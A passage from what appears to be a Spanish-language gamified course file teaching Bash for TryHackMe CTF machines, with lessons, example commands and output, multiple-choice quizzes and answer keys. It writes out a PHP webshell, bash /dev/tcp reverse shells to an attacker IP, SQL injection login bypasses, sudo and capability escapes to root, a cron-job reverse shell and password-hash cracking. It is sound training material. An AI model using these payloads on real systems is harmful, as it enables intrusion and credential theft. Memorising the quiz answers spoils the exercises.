          teoria: "El proceso estándar para resolver una máquina CTF Linux:\n\n1. RECONOCIMIENTO\n   → nmap -sC -sV -oN nmap.txt IP\n\n2. ENUMERACIÓN\n   → gobuster, nikto, enum4linux según puertos\n\n3. EXPLOTACIÓN\n   → Buscar vulnerabilidades según versiones encontradas\n   → searchsploit, ExploitDB, Metasploit\n\n4. POST-EXPLOTACIÓN\n   → id, sudo -l, find SUID, crontab\n   → linpeas para automatizar\n\n5. ESCALADA DE PRIVILEGIOS\n   → Explotar vector encontrado\n\n6. FLAGS\n   → cat /home/*/user.txt\n   → cat /root/root.txt",
          ejemplo: {
            codigo: "# 1. Reconocimiento:\n$ nmap -sC -sV -oN nmap.txt 10.10.10.1\n# Puerto 22 (SSH), 80 (HTTP), 3306 (MySQL)\n\n# 2. Enumeración web:\n$ gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php\n# /admin.php encontrado\n\n# 3. Explotación:\n# admin.php tiene SQLi → extraer credenciales → login como admin → RCE → reverse shell\n$ nc -lnvp 4444\n\n# 4-5. Escalada:\n$ sudo -l → puede ejecutar /usr/bin/find\n$ sudo find . -exec /bin/sh \\;\n# id: uid=0(root)\n\n# 6. Flags:\n$ cat /home/john/user.txt && cat /root/root.txt",
            output: "22/tcp open ssh\n80/tcp open http\n/admin.php (Status: 200)\nuid=0(root) gid=0(root)\nTHM{us3r_fl4g_here}\nTHM{r00t_fl4g_here}"
          },
          pregunta: "¿Cuál es el orden correcto de las fases en un CTF Linux?",
          opciones: [
            "Explotación → Reconocimiento → Escalada → Flags",
            "Reconocimiento → Enumeración → Explotación → Escalada → Flags",
            "Flags → Escalada → Explotación → Reconocimiento",
            "Enumeración → Flags → Reconocimiento → Explotación"
          ],
          correcta: 1,
          explicacion: "El orden correcto es: Reconocimiento (nmap) → Enumeración (gobuster, nikto) → Explotación (RCE, shell) → Post-explotación (id, sudo -l) → Escalada de privilegios → Flags. Saltarse fases lleva a perder vectores importantes. La metodología sistemática es lo que distingue a un pentester profesional."
        },
        {
          id: "bash-4-20",
          titulo: "Resumen Mundo 4",
          teoria: "¡Mundo 4 completado! Ahora dominas las redes desde la terminal.\n\n✅ ip a — configuración de red\n✅ ping — verificar hosts\n✅ nmap — escaneo de puertos y servicios\n✅ ss/netstat — conexiones activas\n✅ ssh — conexión remota y tunneling\n✅ nc — listener y reverse shells\n✅ curl/wget — peticiones HTTP y transferencias\n✅ hydra — brute force\n✅ gobuster — enumeración web\n✅ OpenVPN — conexión a THM/HTB\n✅ Flujo completo de CTF\n\nEstás listo para el Mundo 5 — THM Ready.",
          ejemplo: {
            codigo: "# Checklist completo al iniciar un CTF:\nexport IP=10.10.10.1\nexport LHOST=10.8.0.2  # tu IP tun0\n\n# 1. Reconocimiento rápido:\nnmap -sC -sV -oN nmap_initial.txt $IP\n\n# 2. Reconocimiento completo (background):\nnmap -p- --min-rate=5000 -oN nmap_full.txt $IP &\n\n# 3. Preparar listener:\nnc -lnvp 4444\n\n# 4. Crear workspace:\nmkdir -p ctf_{$IP}/{recon,loot,exploits}",
            output: "Nmap scan report for 10.10.10.1\n22/tcp open ssh OpenSSH 7.6\n80/tcp open http Apache 2.4.29\nListening on 0.0.0.0 4444"
          },
          pregunta: "¿Por qué se hace nmap -p- además del escaneo inicial?",
          opciones: [
            "Para obtener más velocidad",
            "Para escanear todos los 65535 puertos porque el inicial solo escanea 1000",
            "Para detectar el sistema operativo",
            "Para ejecutar scripts NSE"
          ],
          correcta: 1,
          explicacion: "nmap por defecto escanea solo los 1000 puertos más comunes. nmap -p- escanea TODOS los 65535 puertos. En CTFs muchas veces los servicios clave están en puertos no estándar (ejemplo: SSH en 2222, web en 8080, etc.) que el escaneo inicial no detecta. Siempre haz ambos escaneos."
        }
      ],
      desafio: {
        titulo: "Desafío Final — Script de Reconocimiento",
        descripcion: "Crea un script completo de reconocimiento para CTFs que automatice las primeras fases.",
        instrucciones: [
          "El script debe aceptar la IP objetivo como primer argumento ($1)",
          "Si no se pasa argumento, mostrar mensaje de uso y salir",
          "Crear un directorio de trabajo con la IP como nombre",
          "Dentro del directorio, ejecutar nmap -sC -sV y guardar en nmap_initial.txt",
          "Mostrar los puertos abiertos filtrados con grep",
          "Mostrar mensaje de completado con la ruta de los resultados"
        ],
        solucion: `#!/bin/bash

if [ $# -lt 1 ]; then
    echo "Uso: $0 <IP_objetivo>"
    exit 1
fi

IP=$1
DIR="recon_${IP}"

echo "[*] Iniciando reconocimiento de $IP"
mkdir -p $DIR

echo "[*] Ejecutando nmap..."
nmap -sC -sV $IP -oN $DIR/nmap_initial.txt 2>/dev/null

echo "[+] Puertos abiertos:"
grep 'open' $DIR/nmap_initial.txt

echo "[+] Completado. Resultados en: $DIR/"`,
        test: (codigo) => {
          return codigo.includes("#!/bin/bash") &&
                 codigo.includes("$1") &&
                 codigo.includes("mkdir") &&
                 codigo.includes("nmap") &&
                 codigo.includes("grep") &&
                 (codigo.includes("echo") || codigo.includes("print"));
        }
      }
    },

    // ─────────────────────────────────────────────
    // MUNDO 5 — THM READY
    // ─────────────────────────────────────────────
    {
      id: 5,
      nombre: "THM Ready",
      icon: "🏴",
      color: "#f43f5e",
      descripcion: "nc, shells, flags, directorios CTF. Resuelve salas reales de TryHackMe.",
      bloqueado: false,
      niveles: [
        {
          id: "bash-5-1",
          titulo: "Estructura de salas THM",
          teoria: "TryHackMe organiza su contenido en Rooms (salas). Cada sala tiene:\n\n• Tareas numeradas (Task 1, Task 2...)\n• Máquinas que debes iniciar (Start Lab Machine)\n• Preguntas con respuestas específicas\n• Flags con formato THM{...}\n\nTipos de acceso:\n• AttackBox → máquina Kali en el navegador (sin VPN)\n• VPN → conectas tu propio Kali con OpenVPN\n• Split view → la máquina objetivo aparece a la derecha\n\nEn la mayoría de salas las flags están en:\n• /home/usuario/user.txt\n• /root/root.txt",
          ejemplo: {
            codigo: "# Estructura típica de una sala THM:\nTask 1: Introducción (sin máquina)\nTask 2: Reconocimiento\n  → Start Lab Machine\n  → IP: 10.10.X.X\n  → Pregunta: ¿Qué versión de Apache corre?\nTask 3: Explotación\n  → Pregunta: ¿Cuál es el contenido de user.txt?\nTask 4: Escalada\n  → Pregunta: ¿Cuál es el contenido de root.txt?\n\n# Responder preguntas:\n# user.txt: THM{us3r_fl4g}\n# root.txt: THM{r00t_fl4g}",
            output: "Task 2 completada\nTask 3: THM{us3r_fl4g}\nTask 4: THM{r00t_fl4g}"
          },
          pregunta: "¿En qué archivo suele estar la flag de usuario (user flag) en máquinas CTF de THM?",
          opciones: ["/root/user.txt", "/etc/user.txt", "/home/usuario/user.txt", "/tmp/user.txt"],
          correcta: 2,
          explicacion: "La user flag está en el directorio home del usuario no-root: /home/nombreusuario/user.txt. La root flag está en /root/root.txt. En THM siempre hay estas dos flags: una requiere acceso como usuario normal y la otra requiere escalar privilegios a root."
        },
        {
          id: "bash-5-2",
          titulo: "Metodología de reconocimiento THM",
          teoria: "Al iniciar cualquier sala THM con una máquina:\n\n1. Copiar la IP de la tarea\n2. Verificar VPN: ip a | grep tun0\n3. Ping: ping -c 1 IP (confirmar que la máquina está activa)\n4. Nmap: nmap -sC -sV -oN nmap.txt IP\n5. Analizar resultados: ¿Qué puertos hay? ¿Qué servicios?\n6. Buscar exploits según versiones encontradas\n\nTiempos típicos:\n• Máquinas Easy: 1-2 horas\n• Máquinas Medium: 3-5 horas\n• Máquinas Hard: 5+ horas",
          ejemplo: {
            codigo: "# Iniciando sala 'Basic Pentesting' en THM:\nexport IP=10.10.10.100\n\n$ ping -c 1 $IP\n64 bytes from $IP: icmp_seq=1 ttl=64 time=45ms\n# ✓ La máquina está activa\n\n$ nmap -sC -sV $IP\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 2.0.8 or later\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu\n80/tcp open  http    Apache httpd 2.4.18\n\n# Analizo: FTP, SSH, y web. Empiezo por web (puerto 80).",
            output: "64 bytes from 10.10.10.100: icmp_seq=1 ttl=64\n21/tcp open  ftp\n22/tcp open  ssh\n80/tcp open  http    Apache httpd 2.4.18"
          },
          pregunta: "Al iniciar una sala THM, los primeros dos comandos que ejecutas son:",
          opciones: [
            "curl y wget",
            "ping y nmap",
            "ssh y nc",
            "gobuster y hydra"
          ],
          correcta: 1,
          explicacion: "Primero ping -c 1 IP para confirmar que la máquina está activa y responde. Luego nmap -sC -sV IP para saber qué servicios tiene. Todo lo demás depende de lo que encuentres en nmap. Esta secuencia es el ABC del reconocimiento en cualquier CTF."
        },
        {
          id: "bash-5-3",
          titulo: "Interpretar resultados de nmap",
          teoria: "Saber interpretar nmap es crucial. Cada puerto te dice qué explorar:\n\n• Puerto 21 (FTP) → ¿login anónimo? ftp IP\n• Puerto 22 (SSH) → ¿credenciales encontradas? Brute force con hydra\n• Puerto 80/443 (HTTP/S) → gobuster, nikto, analizar web\n• Puerto 139/445 (SMB) → enum4linux, smbclient\n• Puerto 3306 (MySQL) → ¿accesible? credenciales por defecto\n• Puerto 8080 → servicio web alternativo, puede ser menos seguro\n• Puertos altos no estándar → investiga qué servicio es",
          ejemplo: {
            codigo: "# Resultado de nmap típico y qué hacer:\nnmap -sC -sV 10.10.10.1\n\nPORT     STATE  SERVICE  VERSION\n21/tcp   open   ftp      ProFTPD 1.3.5\n  # → searchsploit proftp 1.3.5 (hay RCE conocido!)\n\n22/tcp   open   ssh      OpenSSH 7.4\n  # → guardar para cuando tengamos credenciales\n\n80/tcp   open   http     Apache 2.4.18\n  # → gobuster, revisar código fuente, /robots.txt\n\n445/tcp  open   smb      Samba 3.X\n  # → enum4linux -a IP",
            output: "ProFTPD 1.3.5 → Exploit disponible (CVE-2015-3306)\nApache 2.4.18 → /admin/ encontrado con gobuster\nSamba 3.X → Usuario 'john' enumerado"
          },
          pregunta: "Nmap detecta 'vsftpd 2.3.4' en el puerto 21. ¿Cuál es el siguiente paso?",
          opciones: [
            "Conectarte directamente con ssh",
            "Buscar exploits con searchsploit para vsftpd 2.3.4",
            "Ignorarlo y enfocarte en el puerto 80",
            "Ejecutar hydra contra FTP"
          ],
          correcta: 1,
          explicacion: "vsftpd 2.3.4 tiene una backdoor famosa (CVE-2011-2523). searchsploit vsftpd 2.3.4 mostraría el exploit disponible. Siempre busca exploits según las versiones exactas detectadas por nmap. ExploitDB, searchsploit y Google son tus fuentes. vsftpd 2.3.4 es una de las vulnerabilidades más conocidas en CTFs."
        },
        {
          id: "bash-5-4",
          titulo: "FTP — Enumeración y acceso",
          teoria: "FTP (puerto 21) es común en CTFs. Siempre prueba:\n\n1. Login anónimo: ftp IP → user: anonymous, pass: (vacío)\n2. Listar archivos: ls -la\n3. Descargar: get archivo\n4. Buscar versiones vulnerables con searchsploit\n\nComandos FTP:\n• ftp IP → conectar\n• ls → listar\n• get archivo → descargar\n• put archivo → subir\n• binary → modo binario (para binarios)\n• bye → salir",
          ejemplo: {
            codigo: "$ ftp 10.10.10.1\nConnected to 10.10.10.1.\n220 ProFTPD Server\nName: anonymous\n331 Password required\nPassword: [vacío, solo Enter]\n230 Anonymous access granted\n\nftp> ls -la\n-rw-r--r-- 1 ftp ftp  1024 Jun 1 nota.txt\n-rw-r--r-- 1 ftp ftp  2048 Jun 1 credenciales.bak\n\nftp> get credenciales.bak\nftp> bye\n\n$ cat credenciales.bak\nadmin:P@ssw0rd123",
            output: "230 Anonymous access granted\n-rw-r--r-- 1 ftp ftp  1024 Jun 1 nota.txt\n-rw-r--r-- 1 ftp ftp  2048 Jun 1 credenciales.bak\nadmin:P@ssw0rd123"
          },
          pregunta: "Al conectarte a FTP con usuario 'anonymous', ¿qué contraseña sueles usar?",
          opciones: ["root", "anonymous", "admin", "Cualquiera o vacío"],
          correcta: 3,
          explicacion: "FTP anónimo acepta cualquier contraseña o vacío. Convencionalmente se usa el email como contraseña (guest@example.com) pero la mayoría de servidores FTP anónimos aceptan cualquier string. En CTFs, FTP anónimo frecuentemente tiene archivos con credenciales o notas que dan el siguiente paso."
        },
        {
          id: "bash-5-5",
          titulo: "Robots.txt y código fuente web",
          teoria: "Antes de usar gobuster, explora manualmente:\n\n• /robots.txt → archivos que el admin no quiere indexar en Google (¡puede tener rutas ocultas!)\n• Código fuente (Ctrl+U) → comentarios con credenciales, rutas, versiones\n• /sitemap.xml → mapa del sitio\n• Headers HTTP → Server, X-Powered-By\n• Cookies → frameworks, sesiones\n\nEn CTFs: robots.txt es el PRIMER lugar que revisas en una web.",
          ejemplo: {
            codigo: "$ curl http://10.10.10.1/robots.txt\nUser-agent: *\nDisallow: /secret-admin-panel/\nDisallow: /backup/\nDisallow: /.git/\n\n# ¡Rutas interesantes!\n$ curl http://10.10.10.1/secret-admin-panel/\n<html>Admin Login Panel</html>\n\n$ curl http://10.10.10.1/backup/\n<html>backup.zip  credentials.txt</html>\n\n# Ver código fuente buscando comentarios:\n$ curl -s http://10.10.10.1 | grep -i 'comment\\|TODO\\|password\\|<!--'",
            output: "Disallow: /secret-admin-panel/\nDisallow: /backup/\nDisallow: /.git/\n<html>Admin Login Panel</html>\n<!-- TODO: cambiar contraseña admin:admin123 -->"
          },
          pregunta: "¿Por qué robots.txt es tan valioso en CTFs y pentesting web?",
          opciones: [
            "Porque contiene el mapa completo del sitio",
            "Porque lista rutas que el admin NO quiere que Google indexe, que frecuentemente son paneles de admin o backups",
            "Porque tiene las credenciales de administrador",
            "Porque muestra la versión del servidor web"
          ],
          correcta: 1,
          explicacion: "robots.txt le dice a los crawlers de Google qué no indexar. Los admins ponen ahí rutas sensibles como /admin/, /backup/, /dev/. Irónicamente esto las hace MÁS visibles para pentesters. En CTFs, robots.txt casi siempre tiene una pista clave. Siempre es tu primera parada en enumeración web."
        },
        {
          id: "bash-5-6",
          titulo: "SQLi básico manual",
          teoria: "SQL Injection (SQLi) es inyectar código SQL en campos de entrada.\n\nPrueba básica:\n• ' → ver si hay error SQL\n• ' OR '1'='1 → bypass de autenticación\n• ' OR 1=1-- → comentar el resto de la query\n• admin'-- → login como admin sin contraseña\n\nExtracción con UNION:\n• ' UNION SELECT 1,2,3-- → detectar columnas\n• ' UNION SELECT user(),database(),3--\n\nHerramienta automática: sqlmap -u URL --forms --dump",
          ejemplo: {
            codigo: "# Prueba en campo de login:\nUsuario: admin'--\nContraseña: cualquiera\n# Resultado: Login exitoso como admin\n\n# La query vulnerable era:\n# SELECT * FROM users WHERE user='ENTRADA' AND pass='ENTRADA'\n# Con tu input se convierte en:\n# SELECT * FROM users WHERE user='admin'--' AND pass='...\n# El -- comenta el AND pass, logeando como admin sin contraseña\n\n# Automático con sqlmap:\n$ sqlmap -u 'http://10.10.10.1/login.php' \\\n         --data='user=admin&pass=test' \\\n         --dbs\nAvailable databases:\n  information_schema\n  webapp\n  secrets",
            output: "Login exitoso: admin\nAvailable databases:\n  information_schema\n  webapp\n  secrets"
          },
          pregunta: "¿Qué payload SQLi básico se usa para hacer bypass de autenticación en un campo de usuario?",
          opciones: ["SELECT * FROM users", "admin'--", "1=1", "DROP TABLE users"],
          correcta: 1,
          explicacion: "admin'-- en el campo de usuario cierra el string SQL con ' y comenta el resto de la query con --. La query WHERE user='admin'--' AND pass='...' ignora la verificación de contraseña. Este es el SQLi de bypass de autenticación más clásico y sigue funcionando en aplicaciones mal configuradas."
        },
        {
          id: "bash-5-7",
          titulo: "Subida de archivos y webshells",
          teoria: "Si una web permite subir archivos y no valida el tipo, puedes subir una webshell.\n\nWebshell PHP básica:\n<?php system($_GET['cmd']); ?>\n\nSi la subes como shell.php y accedes a:\nhttp://victima.com/uploads/shell.php?cmd=id\n\nVerás: uid=33(www-data)\n\nTrucos para bypass de filtros:\n• Renombrar: shell.php → shell.php.jpg\n• Doble extensión: shell.php5\n• Content-Type: cambiar con Burp Suite\n• Null byte: shell.php%00.jpg (versiones viejas)",
          ejemplo: {
            codigo: "# Webshell PHP mínima:\n<?php system($_GET['cmd']); ?>\n\n# Guardas como shell.php y la subes\n# Accedes:\n$ curl 'http://10.10.10.1/uploads/shell.php?cmd=id'\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n$ curl 'http://10.10.10.1/uploads/shell.php?cmd=cat+/etc/passwd'\nroot:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\n\n# Reverse shell desde webshell:\n$ curl 'http://10.10.10.1/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/10.8.0.2/4444+0>%261'",
            output: "uid=33(www-data) gid=33(www-data)\nroot:x:0:0:root:/root:/bin/bash\n# Shell recibida en nc -lnvp 4444"
          },
          pregunta: "Subes shell.php con el contenido <?php system($_GET['cmd']); ?> y accedes a /uploads/shell.php?cmd=id. ¿Qué hace esto?",
          opciones: [
            "Ejecuta el comando 'id' en el servidor y muestra el resultado",
            "Muestra el código PHP del archivo",
            "Da error porque PHP no puede ejecutar 'id'",
            "Crea un archivo llamado 'id' en el servidor"
          ],
          correcta: 0,
          explicacion: "system($_GET['cmd']) ejecuta el valor del parámetro cmd como un comando del sistema operativo. ?cmd=id ejecuta 'id' en el servidor y devuelve la salida (uid=33(www-data)). Esto es Remote Code Execution (RCE). Desde aquí puedes ejecutar cualquier comando, incluyendo una reverse shell."
        },
        {
          id: "bash-5-8",
          titulo: "LinPEAS — Automatizar privilege escalation",
          teoria: "LinPEAS (Linux Privilege Escalation Awesome Script) automatiza la búsqueda de vectores de escalada de privilegios.\n\nQué busca:\n• Binarios SUID/SGID\n• Cron jobs mal configurados\n• Credenciales en archivos de configuración\n• Software con versiones vulnerables\n• Capabilities\n• Archivos escribibles por todos\n• Contraseñas en memoria\n\nDescarga: github.com/carlospolop/PEASS-ng",
          ejemplo: {
            codigo: "# Descargar en tu Kali:\n$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\n\n# Transferir a la víctima:\n# Tu Kali:\n$ python3 -m http.server 8080\n\n# En la víctima:\n$ cd /tmp\n$ wget http://10.8.0.2:8080/linpeas.sh\n$ chmod +x linpeas.sh\n$ ./linpeas.sh 2>/dev/null | tee linpeas_output.txt\n\n# Analizar resultados (busca las secciones rojas):\n# [+] SUID files found\n# [+] Cron jobs found\n# [+] Interesting files",
            output: "[+] SUID files:\n/usr/bin/find (SUID + root owner = VULNERABLE)\n[+] Cron jobs:\n*/5 * * * * root /tmp/cleanup.sh (writable by others!)\n[+] Passwords in config files:\n/var/www/html/config.php: $db_pass = 'secreto123'"
          },
          pregunta: "¿Por qué ejecutas linpeas.sh desde /tmp en la máquina víctima?",
          opciones: [
            "Porque /tmp es más rápido",
            "Porque /tmp es escribible por todos los usuarios y no necesitas permisos especiales",
            "Porque linpeas solo funciona en /tmp",
            "Porque /tmp está en RAM y no deja rastros"
          ],
          correcta: 1,
          explicacion: "/tmp tiene permisos rwxrwxrwt — cualquier usuario puede crear y ejecutar archivos ahí. Cuando tienes una shell limitada (como www-data), /tmp es el único lugar donde puedes escribir y ejecutar herramientas. Siempre: cd /tmp antes de transferir herramientas en CTFs."
        },
        {
          id: "bash-5-9",
          titulo: "Hash cracking con john y hashcat",
          teoria: "Cuando obtienes hashes (de /etc/shadow, bases de datos, etc.) necesitas crackearlos.\n\nJohn the Ripper:\n• john --wordlist=rockyou.txt hash.txt → diccionario\n• john --format=md5 hash.txt → especificar formato\n• john --show hash.txt → mostrar crackeados\n• unshadow passwd shadow > combined.txt → preparar para john\n\nHashcat:\n• hashcat -m 0 hash.txt rockyou.txt → MD5\n• hashcat -m 1800 hash.txt rockyou.txt → SHA-512\n• hashcat -m 3200 hash.txt rockyou.txt → bcrypt",
          ejemplo: {
            codigo: "# Identificar tipo de hash:\n$ hash-identifier\nHash: $6$salt$hashvalue\nPossibly MD5 crypt (Unix) - type 1800 for hashcat\n\n# John con /etc/shadow:\n$ unshadow /etc/passwd /etc/shadow > combined.txt\n$ john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt\nUsing default input encoding: UTF-8\nLoaded 2 password hashes\nsecret123        (john)\nP@ssw0rd!        (root)\n\n# Hashcat para MD5:\n$ hashcat -m 0 'hash_md5' /usr/share/wordlists/rockyou.txt\nhash_md5:password123",
            output: "secret123        (john)\nP@ssw0rd!        (root)\nhash_md5:password123"
          },
          pregunta: "En un CTF obtienes el /etc/shadow. ¿Qué combinación de comandos usas para crackear los hashes?",
          opciones: [
            "md5sum + grep",
            "unshadow + john",
            "base64 + hashcat",
            "openssl + crack"
          ],
          correcta: 1,
          explicacion: "Primero unshadow combina /etc/passwd y /etc/shadow en el formato que john entiende. Luego john --wordlist=rockyou.txt archivo_combinado intenta crackear cada hash. john automáticamente detecta el tipo de hash. Es el flujo estándar en CTFs cuando obtienes /etc/shadow."
        },
        {
          id: "bash-5-10",
          titulo: "Shells estables — De nc a TTY",
          teoria: "Una shell recibida por nc es inestable: no tiene Tab, Ctrl+C mata la conexión, no tiene historial.\n\nPara mejorarla a TTY completa:\n\nPaso 1 — En la shell básica:\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n\nPaso 2 — Ctrl+Z (suspende la shell)\n\nPaso 3 — En tu Kali:\nstty raw -echo; fg\n\nPaso 4 — En la shell:\nexport TERM=xterm\n\nAhora tienes Tab, historial, Ctrl+C funciona.",
          ejemplo: {
            codigo: "# Shell básica de nc (inestable):\n$ nc -lnvp 4444\nConnection received on 10.10.10.1\n$ id\nuid=33(www-data)\n\n# Paso 1: Mejorar a pseudo-TTY:\n$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nwww-data@victim:/$\n\n# Paso 2: Suspender con Ctrl+Z\n[1]+  Stopped\n\n# Paso 3: En tu Kali:\n$ stty raw -echo; fg\n\n# Paso 4: En la shell:\n$ export TERM=xterm\n# Ahora tienes Tab, historial, etc.",
            output: "www-data@victim:/$ \n# Shell completamente funcional ahora"
          },
          pregunta: "¿Qué hace python3 -c 'import pty;pty.spawn(\"/bin/bash\")' en una shell básica de netcat?",
          opciones: [
            "Instala Python en la víctima",
            "Mejora la shell básica a una pseudo-terminal con más funcionalidades",
            "Ejecuta un script Python",
            "Abre una conexión Python a tu Kali"
          ],
          correcta: 1,
          explicacion: "pty.spawn crea un pseudo-terminal (PTY) que emula una terminal real. Esto activa el autocompletado con Tab, las flechas para historial, y hace que Ctrl+C no mate la conexión. Combinado con stty raw -echo en tu Kali, obtienes una shell completamente funcional desde netcat."
        },
        {
          id: "bash-5-11",
          titulo: "GTFOBins — Explotar binarios",
          teoria: "GTFOBins (gtfobins.github.io) es una base de datos de cómo explotar binarios de Unix para escalar privilegios.\n\nCasos de uso:\n• Binario en sudo -l → buscar en GTFOBins cómo usarlo\n• Binario con SUID → buscar en GTFOBins\n• Capabilities → buscar en GTFOBins\n\nEjemplos comunes:\n• sudo find . -exec /bin/sh \\; → shell de root\n• sudo vim -c ':!/bin/sh' → shell de root\n• sudo python3 -c 'import os; os.system(\"/bin/bash\")'\n• sudo awk 'BEGIN {system(\"/bin/sh\")}'",
          ejemplo: {
            codigo: "# Escenario: sudo -l muestra:\n#   (ALL) NOPASSWD: /usr/bin/vim\n\n# GTFOBins dice para vim con sudo:\n$ sudo vim -c ':!/bin/bash'\n\n# ¡Tienes shell de root!\nbash-5.0# id\nuid=0(root) gid=0(root)\nbash-5.0# cat /root/root.txt\nTHM{vi_3sc4p3_t0_r00t}\n\n# Otro ejemplo — find con SUID:\n$ sudo find . -exec /bin/sh \\;\n# id\nuid=0(root)",
            output: "uid=0(root) gid=0(root)\nTHM{vi_3sc4p3_t0_r00t}\nuid=0(root)"
          },
          pregunta: "Encuentras que puedes ejecutar 'vim' con sudo sin contraseña. ¿Dónde buscas cómo explotar esto?",
          opciones: [
            "Google directamente",
            "gtfobins.github.io",
            "exploit-db.com",
            "cvedetails.com"
          ],
          correcta: 1,
          explicacion: "GTFOBins (gtfobins.github.io) es la referencia definitiva para escalar privilegios con binarios Unix. Tiene entradas para sudo, SUID, capabilities, etc. Cuando sudo -l muestra un binario, inmediatamente buscas ese binario en GTFOBins. Tiene el payload exacto para cada caso."
        },
        {
          id: "bash-5-12",
          titulo: "Capabilities de Linux",
          teoria: "Las capabilities son una forma granular de otorgar privilegios sin dar root completo.\n\nBuscar capabilities:\n• getcap -r / 2>/dev/null → busca todas las capabilities\n\nCapabilities peligrosas:\n• cap_setuid+ep → puede cambiar UID a root\n• cap_net_raw+ep → puede capturar tráfico\n• cap_sys_admin+ep → muchos privilegios de admin\n\nSi python3 tiene cap_setuid:\n$ python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
          ejemplo: {
            codigo: "# Buscar capabilities:\n$ getcap -r / 2>/dev/null\n/usr/bin/python3.8 = cap_setuid+ep\n/usr/bin/perl = cap_setuid+ep\n\n# Explotar python3 con cap_setuid:\n$ python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\nroot@victim:/# id\nuid=0(root) gid=33(www-data)\nroot@victim:/# cat /root/root.txt\nTHM{c4p4b1l1t13s_3sc4p3}",
            output: "/usr/bin/python3.8 = cap_setuid+ep\n/usr/bin/perl = cap_setuid+ep\nuid=0(root) gid=33(www-data)\nTHM{c4p4b1l1t13s_3sc4p3}"
          },
          pregunta: "¿Qué comando busca capabilities asignadas a binarios en todo el sistema?",
          opciones: [
            "find / -cap 2>/dev/null",
            "getcap -r / 2>/dev/null",
            "ls -cap / 2>/dev/null",
            "cap -list / 2>/dev/null"
          ],
          correcta: 1,
          explicacion: "getcap -r / busca recursivamente (-r) desde / todos los archivos con capabilities asignadas. Es un vector de privilege escalation menos conocido que SUID pero igual de efectivo. Si encuentras cap_setuid en Python o Perl, tienes escalada trivial a root con una sola línea."
        },
        {
          id: "bash-5-13",
          titulo: "Cron jobs — Escalada clásica",
          teoria: "Los cron jobs son tareas programadas. Si root ejecuta un script que tú puedes modificar, tienes escalada de privilegios.\n\nFlujo del ataque:\n1. Identificar cron job de root que ejecuta script escribible\n2. Modificar el script para añadir privilegios o reverse shell\n3. Esperar a que el cron lo ejecute\n\nTambién: PATH hijacking en cron — si el script llama a un comando sin ruta absoluta, puedes poner tu versión maliciosa primero en el PATH.",
          ejemplo: {
            codigo: "# Ver cron jobs:\n$ cat /etc/crontab\n*/5 * * * * root /opt/scripts/cleanup.sh\n\n# ¿Es escribible el script?\n$ ls -la /opt/scripts/cleanup.sh\n-rwxrwxrwx 1 root root 50 Jun 1 cleanup.sh\n# ¡Todos pueden escribir!\n\n# Añadir reverse shell al script:\n$ echo 'bash -i >& /dev/tcp/10.8.0.2/4444 0>&1' >> /opt/scripts/cleanup.sh\n\n# En tu Kali, escuchar:\n$ nc -lnvp 4444\n# Esperar hasta 5 minutos...\nConnection received from 10.10.10.1\nroot@victim:~# id\nuid=0(root)",
            output: "*/5 * * * * root /opt/scripts/cleanup.sh\n-rwxrwxrwx 1 root root 50 Jun 1 cleanup.sh\nuid=0(root) gid=0(root)"
          },
          pregunta: "Encuentras que root ejecuta cada 5 minutos /tmp/check.sh y ese archivo tiene permisos 777. ¿Cómo escalas privilegios?",
          opciones: [
            "Eliminar el archivo",
            "Añadir 'chmod +s /bin/bash' o una reverse shell al archivo y esperar",
            "Cambiar los permisos del archivo a 000",
            "Leer el contenido del archivo"
          ],
          correcta: 1,
          explicacion: "Si puedes escribir en un script que root ejecuta automáticamente, añades tu payload: echo 'chmod u+s /bin/bash' >> /tmp/check.sh. Cuando root lo ejecute en el siguiente ciclo, /bin/bash tendrá SUID y puedes ejecutar /bin/bash -p para obtener shell de root. También puedes añadir una reverse shell directamente."
        },
        {
          id: "bash-5-14",
          titulo: "Búsqueda de credenciales",
          teoria: "Las credenciales están en muchos lugares. Búsqueda sistemática:\n\n• Archivos de configuración web:\n  find / -name 'config.php' -o -name '*.conf' 2>/dev/null\n\n• Credenciales hardcodeadas:\n  grep -r 'password' /var/www/ 2>/dev/null\n  grep -r 'passwd' /etc/ 2>/dev/null\n\n• Historial de bash:\n  cat ~/.bash_history\n  cat /home/*/.bash_history\n\n• Bases de datos SQLite:\n  find / -name '*.db' -o -name '*.sqlite' 2>/dev/null",
          ejemplo: {
            codigo: "# Buscar config de WordPress:\n$ find / -name 'wp-config.php' 2>/dev/null\n/var/www/html/wp-config.php\n\n$ grep -i 'password\\|user\\|pass' /var/www/html/wp-config.php\ndefine('DB_USER', 'wordpress');\ndefine('DB_PASSWORD', 'SuperSecret!');\n\n# Historial de bash:\n$ cat /home/john/.bash_history\ncd /opt/secret\nmysql -u root -p 'RootPass2024'\nssh admin@192.168.100.10\n\n# Conexión a MySQL con credenciales encontradas:\n$ mysql -u root -p'RootPass2024' -e 'show databases;'",
            output: "DB_USER: wordpress\nDB_PASSWORD: SuperSecret!\nmysql -u root -p 'RootPass2024'\nssh admin@192.168.100.10\n+--------------------+\n| Database           |\n| information_schema |\n| wordpress          |\n| secret_db          |"
          },
          pregunta: "¿Por qué revisar ~/.bash_history puede ser útil en un CTF?",
          opciones: [
            "Para ver qué comandos aprendió el usuario",
            "Porque puede contener comandos con contraseñas en texto plano que el usuario ejecutó antes",
            "Para ver cuándo fue el último login",
            "Para encontrar archivos modificados recientemente"
          ],
          correcta: 1,
          explicacion: "bash_history guarda todos los comandos ejecutados. Si alguien ejecutó mysql -u root -p'contraseña' o ssh -p'pass' user@host, la contraseña queda en el historial en texto plano. En CTFs esto da credenciales para SSH, MySQL, sudo, etc. Siempre revisa: cat ~/.bash_history y cat /home/*/.bash_history."
        },
        {
          id: "bash-5-15",
          titulo: "Resolviendo preguntas de THM",
